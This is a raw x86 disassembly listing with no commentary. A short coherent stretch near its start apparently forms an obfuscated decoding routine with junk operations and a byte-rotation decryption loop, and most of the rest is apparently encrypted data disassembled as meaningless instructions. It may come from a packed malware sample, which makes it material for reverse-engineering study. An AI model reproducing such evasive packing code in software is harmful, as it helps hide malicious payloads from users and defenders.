  4038bd:	jne    0x403939
  4038bf:	jmp    0x603d5940
  4038c4:	xchg   edx,eax
  4038c5:	repz (bad) 
  4038c7:	mov    ds:0x73a0b901,eax
  4038cc:	je     0x4038ee
  4038ce:	cmp    BYTE PTR [edi+0x43],ah
  4038d1:	jmp    0x403906
  4038d3:	enter  0xa47f,0xe8
  4038d7:	add    BYTE PTR [edi+edi*2],0xa3
  4038db:	enter  0x738c,0x6d
  4038df:	mov    eax,ds:0x9d325d
  4038e4:	dec    eax
  4038e5:	and    eax,0x13a856a5
  4038ea:	adc    eax,0xa413b214
  4038ef:	fsubrp st(4),st
  4038f1:	and    al,0xc2
  4038f3:	out    dx,eax
  4038f4:	in     al,dx
  4038f5:	jae    0x40389c
  4038f7:	leave  
  4038f8:	xor    al,0x19
  4038fa:	das    
  4038fb:	pop    eax
  4038fc:	ret    
  4038fd:	sbb    esi,esp
  4038ff:	mov    ebp,0x8b49c797
  403904:	dec    ebp
  403905:	lock sub DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x42fa44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x42fa18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xdec4e32d,al
  403bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bc2:	addr16 in al,dx
  403bc4:	hlt    
  403bc5:	pushf  
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	dec    ecx
  403bcd:	sub    ebp,edi
  403bcf:	test   al,0xda
  403bd1:	adc    eax,0x9c1b4b82
  403bd6:	into   
  403bd7:	jge    0x403bd9
  403bd9:	jae    0x403c03
  403bdb:	lock add dl,BYTE PTR [edi-0x4c]
  403bdf:	imul   eax,DWORD PTR [edi+0x7a],0xffffffb9
  403be3:	cs jnp 0x403b6f
  403be6:	fwait
  403be7:	test   al,0x94
  403be9:	imul   ecx,DWORD PTR [ebx+eax*2+0x49],0xffffff94
  403bee:	add    ch,BYTE PTR [edx]
  403bf0:	inc    ebx
  403bf1:	(bad)  
  403bf2:	pop    eax
  403bf3:	xchg   ebx,eax
  403bf4:	sbb    al,0x30
  403bf6:	cld    
  403bf7:	popf   
  403bf8:	mov    eax,0x3c88cafb
  403bfd:	adc    dl,BYTE PTR [edi]
  403bff:	cmp    esi,DWORD PTR [ebp+0xe]
  403c02:	pop    esi
  403c03:	or     BYTE PTR ds:0xe08f0286,bl
  403c09:	push   edx
  403c0a:	icebp  
  403c0b:	push   cs
  403c0c:	imul   ebx,ebp,0x75602eda
  403c12:	scas   al,BYTE PTR es:[edi]
  403c13:	add    bl,BYTE PTR [ebp+eiz*1-0x2ec70031]
  403c1a:	pop    esp
  403c1b:	or     BYTE PTR [ebp-0x35598066],dl
  403c21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c22:	sti    
  403c23:	mov    dh,0xfb
  403c25:	sar    BYTE PTR [edi-0x29],1
  403c28:	adc    BYTE PTR [ecx-0xd],dl
  403c2b:	mov    cl,0xbd
  403c2d:	pop    ebp
  403c2e:	push   0x7f32f278
  403c33:	outs   dx,BYTE PTR ds:[esi]
  403c34:	lahf   
  403c35:	fimul  DWORD PTR [edx+edi*2+0x63]
  403c39:	out    dx,al
  403c3a:	repz xchg edx,eax
  403c3c:	dec    ecx
  403c3d:	and    DWORD PTR [edi+edx*8-0x5d],esi
  403c41:	inc    eax
  403c42:	push   edx
  403c43:	xlat   BYTE PTR ds:[ebx]
  403c44:	ja     0x403bdb
  403c46:	add    bh,BYTE PTR [edx+0x5dcb2b94]
  403c4c:	bound  eax,QWORD PTR [ecx]
  403c4e:	jb     0x403c7a
  403c50:	loope  0x403c1f
  403c52:	addr16 (bad) 
  403c54:	jecxz  0x403be5
  403c56:	out    0xcc,eax
  403c58:	(bad)  
  403c59:	jp     0x403c19
  403c5b:	sbb    al,0xea
  403c5d:	jae    0x403c3c
  403c5f:	mov    es,ebx
  403c61:	and    eax,0x7136aa9c
  403c66:	and    eax,0xc4d08da9
  403c6b:	gs push ebx
  403c6e:	lea    ecx,[eax+0x2277529b]
  403c74:	jae    0x403c4f
  403c76:	mov    dh,0x63
  403c78:	inc    edx
  403c79:	ins    DWORD PTR es:[edi],dx
  403c7a:	neg    esi
  403c7c:	xor    al,ch
  403c7e:	lods   al,BYTE PTR ds:[esi]
  403c7f:	retf   
  403c80:	or     edx,DWORD PTR [ebp+0x67]
  403c83:	test   DWORD PTR [ecx],ebx
  403c85:	mov    eax,ds:0xee8d9ece
  403c8a:	icebp  
  403c8b:	push   ss
  403c8c:	aaa    
  403c8d:	(bad)  
  403c8e:	jmp    0xe408:0xf0a6fb7f
  403c95:	mov    WORD PTR [ebx-0x4d],?
  403c98:	mov    al,0x49
  403c9a:	add    eax,0x92f1e101
  403c9f:	cmp    eax,0x2bdc8f4f
  403ca4:	test   bh,al
  403ca6:	push   es
  403ca7:	dec    eax
  403ca8:	xor    BYTE PTR [edx+0x6eee5840],bh
  403cae:	rcl    BYTE PTR [ebp-0x1b68fc4d],cl
  403cb4:	xor    ah,ch
  403cb6:	pusha  
  403cb7:	jnp    0x403c88
  403cb9:	push   edi
  403cba:	lods   al,BYTE PTR ds:[esi]
  403cbb:	sub    al,0x11
  403cbd:	sbb    DWORD PTR ds:0xd88587fd,edx
  403cc3:	jno    0x403c73
  403cc5:	mov    al,ds:0xb7f2175
  403cca:	pop    edx
  403ccb:	cmp    BYTE PTR [ebx+0x66],dl
  403cce:	push   ebx
  403ccf:	scas   eax,DWORD PTR es:[edi]
  403cd0:	pushf  
  403cd1:	movhlps xmm2,xmm0
  403cd4:	add    eax,DWORD PTR [ecx+edi*4]
  403cd7:	sbb    cl,BYTE PTR es:[edx+0x6f272256]
  403cde:	js     0x403d2e
  403ce0:	repnz pop esp
  403ce2:	retf   0xcc01
  403ce5:	dec    ecx
  403ce6:	push   ebx
  403ce7:	loope  0x403d02
  403ce9:	mov    BYTE PTR [esi],ah
  403ceb:	sub    dl,bh
  403ced:	mov    ebp,0x32b69fd1
  403cf2:	inc    eax
  403cf3:	adc    eax,ebp
  403cf5:	xchg   ah,al
  403cf7:	pop    esp
  403cf8:	stc    
  403cf9:	aam    0x80
  403cfb:	inc    edi
  403cfc:	(bad)  
  403cfd:	or     ah,al
  403cff:	out    dx,al
  403d00:	stos   DWORD PTR es:[edi],eax
  403d01:	mov    ch,BYTE PTR [edx+0x43]
  403d04:	retf   0xe945
  403d07:	pop    es
  403d08:	sbb    eax,0x6943567
  403d0d:	dec    ebp
  403d0e:	push   ds
  403d0f:	or     eax,0xea73dd5b
  403d14:	stc    
  403d15:	add    DWORD PTR [esi-0x28],esp
  403d18:	and    eax,0xddeb3ff5
  403d1d:	mov    ebp,0x395da87
  403d22:	pushf  
  403d23:	sub    DWORD PTR [eax],esi
  403d25:	jmp    0x91c18cd9
  403d2a:	xchg   esp,eax
  403d2b:	sub    DWORD PTR [esp+ebp*8],0xffffffb1
  403d2f:	mov    al,BYTE PTR [ecx]
  403d31:	dec    edx
  403d32:	in     eax,dx
  403d33:	sbb    eax,ebp
  403d35:	(bad)  
  403d37:	adc    DWORD PTR [esp+esi*4],esp
  403d3a:	mov    BYTE PTR [esi-0x64b1e65d],al
  403d40:	jno    0x403db3
  403d42:	mov    edx,0xc2acb9e8
  403d47:	daa    
  403d48:	xchg   ecx,eax
  403d49:	test   DWORD PTR [esp+ebx*4-0x1e],0x167c4ef
  403d51:	add    al,0x5a
  403d53:	gs mov ebx,ebx
  403d56:	inc    ebx
  403d57:	cmp    DWORD PTR [ebp+0x75],0x7558ffcf
  403d5e:	push   eax
  403d5f:	repnz scas eax,DWORD PTR es:[edi]
  403d61:	cmp    BYTE PTR [ebx-0x1d79c6c7],ch
  403d67:	xor    al,0x1
  403d69:	dec    ebx
  403d6a:	pop    es
  403d6b:	sub    BYTE PTR [eax+0x104afd57],0xd7
  403d72:	mov    ds:0x53bf26c3,eax
  403d77:	sahf   
  403d78:	inc    eax
  403d79:	mov    ebp,0xed93ca2a
  403d7e:	stos   BYTE PTR es:[edi],al
  403d7f:	ret    0x57d3
  403d82:	xchg   edi,eax
  403d83:	adc    eax,0xc93d2029
  403d88:	xor    edx,DWORD PTR ds:0x9920c33
  403d8e:	sbb    eax,0xda80be38
  403d93:	ficomp WORD PTR [ebp+0x46]
  403d96:	aam    0x67
  403d98:	and    ebp,DWORD PTR ss:[ebp+0x61]
  403d9c:	pop    ebx
  403d9d:	pusha  
  403d9e:	lods   al,BYTE PTR ds:[esi]
  403d9f:	cwde   
  403da0:	add    DWORD PTR [edi-0xf],esp
  403da3:	sbb    DWORD PTR [ebp+0x3b83c7e3],ecx
  403da9:	mov    ebp,0x8d86ffb0
  403dae:	pop    ds
  403daf:	jge    0x403dbb
  403db1:	call   0x7241:0xe18b0d5d
  403db8:	fwait
  403db9:	ins    BYTE PTR es:[edi],dx
  403dba:	lds    ebx,FWORD PTR [esi+ecx*4]
  403dbd:	and    dh,BYTE PTR [edx+0x4ca7ac99]
  403dc3:	jp     0x403d9c
  403dc5:	push   ebx
  403dc6:	call   FWORD PTR [edi]
  403dc8:	arpl   WORD PTR [edi],si
  403dca:	xchg   edi,eax
  403dcb:	addr16 jg 0x403e35
  403dce:	adc    eax,0xa3b5506c
  403dd3:	dec    ecx
  403dd4:	sub    DWORD PTR [ebp-0x383040e2],ebp
  403dda:	xchg   ebx,eax
  403ddb:	pop    edx
  403ddc:	sub    ch,BYTE PTR [ecx]
  403dde:	add    ebp,DWORD PTR gs:[eax]
  403de1:	mov    al,0xc6
  403de3:	add    BYTE PTR [esi+0x3096dd7b],dl
  403de9:	sahf   
  403dea:	inc    edx
  403deb:	data16 sbb BYTE PTR es:[ebp+0x9],ah
  403df0:	cmp    DWORD PTR [eax+eax*4],ebx
  403df3:	les    esp,FWORD PTR [edx-0x60]
  403df6:	adc    al,0x59
  403df8:	jo     0x403d7e
  403dfa:	retf   
  403dfb:	arpl   WORD PTR [esi],bx
  403dfd:	or     BYTE PTR ds:0x35be2b23,ch
  403e03:	lahf   
  403e04:	or     DWORD PTR [eax+0x4e],0x2d3d0c58
  403e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e0c:	cld    
  403e0d:	cdq    
  403e0e:	aas    
  403e0f:	add    eax,0x858e45a0
  403e14:	jnp    0x403e93
  403e16:	cli    
  403e17:	das    
  403e18:	push   ebx
  403e19:	aad    0x63
  403e1b:	imul   eax,DWORD PTR [esi],0x3e
  403e1e:	dec    esi
  403e1f:	cmc    
  403e20:	ret    
  403e21:	(bad)  
  403e22:	das    
  403e23:	and    BYTE PTR [edx+edx*4],0x41
  403e27:	push   ebp
  403e28:	and    al,0xc1
  403e2a:	(bad)  
  403e2b:	mov    al,ds:0xd2f71a6
  403e30:	ja     0x403e1b
  403e32:	push   ss
  403e33:	jmp    0x403e85
  403e35:	inc    ebp
  403e36:	sbb    eax,0x6283b1ed
  403e3b:	or     al,0xa0
  403e3d:	test   al,0x1c
  403e3f:	dec    eax
  403e40:	inc    eax
  403e41:	ss jmp 0x580cc9b5
  403e47:	inc    edi
  403e48:	out    dx,al
  403e49:	pop    edx
  403e4a:	fwait
  403e4b:	mov    cl,0xe2
  403e4d:	jmp    0x1e1608a
  403e52:	out    dx,eax
  403e53:	inc    edi
  403e54:	(bad)  
  403e55:	jne    0x403df7
  403e57:	outs   dx,BYTE PTR ds:[esi]
  403e58:	push   edi
  403e59:	add    BYTE PTR [edx+edi*8],ah
  403e5c:	xchg   ebx,eax
  403e5d:	push   ds
  403e5e:	cmp    esi,DWORD PTR [ebx+0x38]
  403e61:	push   cs
  403e62:	mov    edx,0x212ea62
  403e67:	cmc    
  403e68:	or     eax,0xbc9915d1
  403e6d:	jnp    0x403e1d
  403e6f:	pop    ds
  403e70:	fcom   DWORD PTR ds:0xea524e43
  403e76:	or     ecx,DWORD PTR [esi+eax*8]
  403e79:	inc    esi
  403e7a:	adc    edi,DWORD PTR [esp+ecx*4]
  403e7d:	inc    ebx
  403e7e:	stos   DWORD PTR es:[edi],eax
  403e7f:	mov    WORD PTR [ebp-0x78],gs
  403e82:	push   ecx
  403e83:	retf   0xa9
  403e86:	add    BYTE PTR [ecx-0x48dd855f],ah
  403e8c:	push   es
  403e8d:	ret    0x7534
  403e90:	cmp    eax,0xdf4d8560
  403e95:	aad    0x91
  403e97:	push   ds
  403e98:	push   ss
  403e99:	pop    edx
  403e9a:	xor    al,BYTE PTR [esp+edi*2+0x50]
  403e9e:	(bad)  
  403e9f:	jge    0x403f0c
  403ea1:	sti    
  403ea2:	xchg   edx,eax
  403ea3:	stos   DWORD PTR es:[edi],eax
  403ea4:	jns    0x403eb5
  403ea6:	sub    cl,BYTE PTR [edi-0x4fbdd7e6]
  403eac:	jecxz  0x403e32
  403eae:	and    dl,0x3a
  403eb1:	(bad)  
  403eb2:	ret    0xe195
  403eb5:	xor    ecx,DWORD PTR [ebx]
  403eb7:	(bad)  
  403eb8:	xlat   BYTE PTR ds:[ebx]
  403eb9:	pop    ds
  403eba:	xor    ebp,DWORD PTR [edx]
  403ebc:	xchg   DWORD PTR [edi+0x29c883f],edx
  403ec2:	ins    BYTE PTR es:[edi],dx
  403ec3:	aas    
  403ec4:	cdq    
  403ec5:	fcom   DWORD PTR [edx+0x7ea64f3b]
  403ecb:	stos   DWORD PTR es:[edi],eax
  403ecc:	(bad)
  403ecf:	dec    eax
  403ed0:	shl    BYTE PTR [edx],0x9
  403ed3:	sbb    ch,BYTE PTR [edi-0x22]
  403ed6:	and    al,0xb3
  403ed8:	push   esi
  403ed9:	fisub  DWORD PTR [eax]
  403edb:	ins    BYTE PTR es:[edi],dx
  403edc:	scas   eax,DWORD PTR es:[edi]
  403edd:	lock loope 0x403f0e
  403ee0:	jmp    0x403efe
  403ee2:	xchg   DWORD PTR [ecx],ecx
  403ee4:	pop    edx
  403ee5:	cmp    bh,bh
  403ee7:	(bad)  
  403ee8:	pop    ecx
  403ee9:	pusha  
  403eea:	out    0x64,eax
  403eec:	add    eax,0x86de5b4a
  403ef1:	bound  esi,QWORD PTR [ecx+0x18fe6116]
  403ef7:	mov    bh,0x7d
  403ef9:	cmp    ebx,eax
  403efb:	push   es
  403efc:	fnstenv [ebp+0x74]
  403eff:	cmp    cl,BYTE PTR [esi-0x70ea7ec7]
  403f05:	and    eax,0x62
  403f08:	xchg   ebp,eax
  403f09:	js     0x403e9e
  403f0b:	push   ecx
  403f0c:	xchg   esi,eax
  403f0d:	mov    BYTE PTR [eax],ah
  403f0f:	mov    eax,ds:0xb52a4463
  403f14:	hlt    
  403f15:	dec    ecx
  403f16:	enter  0xe4f,0xb6
  403f1a:	xor    DWORD PTR ds:0xefcd36a,esp
  403f20:	jle    0x403f0e
  403f22:	xor    BYTE PTR [edx+0x45],ch
  403f25:	(bad)  
  403f26:	mov    ebp,0xccd64a9b
  403f2b:	mov    ch,0xa2
  403f2d:	push   esi
  403f2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f2f:	int    0x57
  403f31:	pop    ecx
  403f32:	mov    bh,0x6
  403f34:	cmp    al,0x4e
  403f36:	cmp    esi,esp
  403f38:	pop    esi
  403f39:	adc    dh,BYTE PTR [ebx]
  403f3b:	push   ds
  403f3c:	add    eax,0x169d7150
  403f41:	arpl   WORD PTR [ecx-0x42],di
  403f44:	bound  esp,QWORD PTR [edi]
  403f46:	(bad)  
  403f47:	js     0x403f92
  403f49:	xchg   esi,eax
  403f4a:	sahf   
  403f4b:	shl    BYTE PTR [ebx],0x81
  403f4e:	push   edi
  403f4f:	jmp    0xcaea:0xc0dd9e96
  403f56:	pop    ebp
  403f57:	shl    ecx,1
  403f59:	mov    esi,0xf8523a2b
  403f5e:	pusha  
  403f5f:	popf   
  403f60:	mov    ebp,0x10cbe034
  403f65:	test   al,0xd9
  403f67:	sub    al,0xc4
  403f69:	adc    DWORD PTR [ebx+0x20bd688e],ebx
  403f6f:	outs   dx,BYTE PTR ds:[esi]
  403f70:	add    al,0xc3
  403f72:	dec    edi
  403f73:	pop    edx
  403f74:	aaa    
  403f75:	add    DWORD PTR [eax],0x298ec49e
  403f7b:	jbe    0x403fba
  403f7d:	xchg   esp,eax
  403f7e:	add    al,0x45
  403f80:	pop    edi
  403f81:	xchg   edx,eax
  403f82:	add    eax,0xd1eca5d6
  403f87:	sbb    al,0x20
  403f89:	cmp    BYTE PTR [ecx+esi*2-0x3c],bh
  403f8d:	push   edx
  403f8e:	mov    esp,0xc757c3b6
  403f93:	popf   
  403f94:	fwait
  403f95:	add    DWORD PTR [esi-0x6edd0f5b],0x67bee85a
  403f9f:	sbb    al,0x1f
  403fa1:	push   ds
  403fa2:	mov    esp,0x447fe1af
  403fa7:	adc    eax,0x7c833164
  403fac:	call   0x8cd87581
  403fb1:	rcl    cl,cl
  403fb3:	jle    0x403fca
  403fb5:	fldcw  WORD PTR [eax]
  403fb7:	lock xor bh,BYTE PTR gs:[ebx+0x4f681a2]
  403fbf:	lock push ecx
  403fc1:	fist   DWORD PTR [ecx+0x28db9869]
  403fc7:	in     eax,dx
  403fc8:	sti    
  403fc9:	push   0x1ccae4c5
  403fce:	pop    es
  403fcf:	stos   BYTE PTR es:[edi],al
  403fd0:	pop    ds
  403fd1:	push   ecx
  403fd2:	dec    eax
  403fd3:	push   ebx
  403fd4:	cld    
  403fd5:	mov    dh,BYTE PTR [eax]
  403fd7:	(bad)  
  403fd8:	push   esi
  403fd9:	nop
  403fda:	jns    0x403f5c
  403fdc:	xor    DWORD PTR [ecx+0x2a],ebp
  403fdf:	scas   eax,DWORD PTR es:[edi]
  403fe0:	pop    edi
  403fe1:	mov    bl,0x8f
  403fe3:	pusha  
  403fe4:	pop    ebx
  403fe5:	jge    0x403fdb
  403fe7:	jg     0x404063
  403fe9:	shl    DWORD PTR ds:0x4e9a1ca2,cl
  403fef:	out    dx,eax
  403ff0:	fistp  WORD PTR [ebp+eiz*8-0x5f9f357b]
  403ff7:	sti    
  403ff8:	in     al,0x77
  403ffa:	push   cs
  403ffb:	xchg   esp,eax
  403ffc:	ins    BYTE PTR es:[edi],dx
  403ffd:	inc    esi
  403ffe:	pop    ebp
  403fff:	ror    DWORD PTR [edi],cl
  404001:	and    BYTE PTR [eax-0xa],ch
  404004:	mov    dl,0x2a
  404006:	adc    al,0xd8
  404008:	imul   eax,DWORD PTR [eax],0xca6e8a67
  40400e:	outs   dx,DWORD PTR ds:[esi]
  40400f:	xor    BYTE PTR [ebx],0xa4
  404012:	and    eax,0x123e7469
  404017:	ss adc al,0x44
  40401a:	dec    ebp
  40401b:	shl    DWORD PTR ds:0x30b9988b,cl
  404021:	dec    ecx
  404022:	es inc esi
  404024:	xchg   esi,eax
  404025:	and    ah,al
  404027:	in     eax,0xcf
  404029:	push   ebx
  40402a:	retf   0x1eb1
  40402d:	adc    BYTE PTR [edi],ch
  40402f:	mov    ecx,0xcfd4c2e2
  404034:	mov    ch,0xd
  404036:	cdq    
  404037:	ins    DWORD PTR es:[edi],dx
  404038:	ret    
  404039:	inc    ebp
  40403a:	push   ebx
  40403b:	push   esp
  40403c:	push   ebp
  40403d:	js     0x4040a1
  40403f:	retf   
  404040:	xor    dh,BYTE PTR [ebp-0x18c6cba3]
  404046:	fucomip st,st(4)
  404048:	mul    ch
  40404a:	and    al,0x8b
  40404c:	loopne 0x404016
  40404e:	mov    dh,0x75
  404050:	sahf   
  404051:	cld    
  404052:	sbb    DWORD PTR [eax],0x9f2d23a7
  404058:	in     eax,dx
  404059:	pop    ecx
  40405a:	adc    DWORD PTR [eax-0x7c],ebx
  40405d:	sbb    eax,0x9966280c
  404062:	adc    BYTE PTR [ebp+0x10],cl
  404065:	mov    al,0xc2
  404067:	outs   dx,DWORD PTR ds:[esi]
  404068:	cmc    
  404069:	sbb    eax,0x589d4bd0
  40406e:	or     BYTE PTR [ebp+0x18],bl
  404071:	or     DWORD PTR [ebx+0x9],edx
  404074:	cmp    DWORD PTR [edx],esi
  404076:	push   ebx
  404077:	iret   
  404078:	sahf   
  404079:	(bad)  
  40407a:	popa   
  40407b:	(bad)  
  40407c:	cmp    cl,BYTE PTR [edi+edx*1+0x39]
  404080:	mov    esp,0xbaa9ebb8
  404085:	lea    esp,[ebx-0x19]
  404088:	mov    al,ds:0xa33e3106
  40408d:	cli    
  40408e:	ins    BYTE PTR es:[edi],dx
  40408f:	push   0xba2b7fb1
  404094:	jno    0x404098
  404096:	adc    edi,DWORD PTR [esi]
  404098:	push   ebx
  404099:	fcom   DWORD PTR [edx+0x702a2bed]
  40409f:	sbb    BYTE PTR [eax],dl
  4040a1:	shl    bl,cl
  4040a3:	popf   
  4040a4:	ror    dh,cl
  4040a6:	xor    BYTE PTR [edx+0x6adb411e],0x91
  4040ad:	lods   eax,DWORD PTR ds:[esi]
  4040ae:	test   BYTE PTR ds:0x53d0c4d6,cl
  4040b4:	arpl   WORD PTR [ecx-0x25],bp
  4040b7:	stos   DWORD PTR es:[edi],eax
  4040b8:	hlt    
  4040b9:	push   ds
  4040ba:	jmp    0x97b4ee29
  4040bf:	inc    esi
  4040c0:	adc    DWORD PTR [edx],ecx
  4040c2:	clc    
  4040c3:	adc    BYTE PTR [ebp-0x34],ah
  4040c6:	fcom   DWORD PTR [eax]
  4040c8:	fwait
  4040c9:	mul    DWORD PTR [ebx+0xe]
  4040cc:	shr    BYTE PTR [edx],0x4d
  4040cf:	ror    BYTE PTR [edx+0x110bc88c],1
  4040d5:	int3   
  4040d6:	cmp    eax,0xa59186f4
  4040db:	mov    ch,0x0
  4040dd:	cmp    ecx,DWORD PTR [esi-0x74]
  4040e0:	jbe    0x404116
  4040e2:	gs push eax
  4040e4:	cs mov ebx,0xba05f357
  4040ea:	add    dh,BYTE PTR ds:0xf073e8b2
  4040f0:	or     esi,esp
  4040f2:	call   0x4ad5:0xe37bccf4
  4040f9:	jg     0x404100
  4040fb:	sub    eax,0x593851a3
  404100:	cmp    ecx,edx
  404102:	add    cl,BYTE PTR [ebx]
  404104:	or     al,0x53
  404106:	dec    edi
  404107:	icebp  
  404108:	test   al,0x5c
  40410a:	into   
  40410b:	jns    0x40415f
  40410d:	shl    esp,0x86
  404110:	sbb    esi,DWORD PTR [esi+0x4df45818]
  404116:	cmp    al,0xf9
  404118:	ret    0x1952
  40411b:	cmp    ebx,ecx
  40411d:	sbb    eax,0xad7f8f18
  404122:	xchg   edi,eax
  404123:	cdq    
  404124:	jg     0x404167
  404126:	push   cs
  404127:	out    dx,al
  404128:	or     eax,0x6dfa44ce
  40412d:	pop    esp
  40412e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40412f:	cmc    
  404130:	fistp  QWORD PTR [edi]
  404132:	mov    dl,0xaa
  404134:	sbb    ebx,esi
  404136:	icebp  
  404137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404138:	mov    esi,0x6b28525
  40413d:	std    
  40413e:	jmp    0x404126
  404140:	push   ebx
  404141:	xchg   ecx,eax
  404142:	pusha  
  404143:	(bad)  
  404144:	sar    DWORD PTR [ebx+eiz*8-0x36],0x85
  404149:	dec    edi
  40414a:	ret    0xf84e
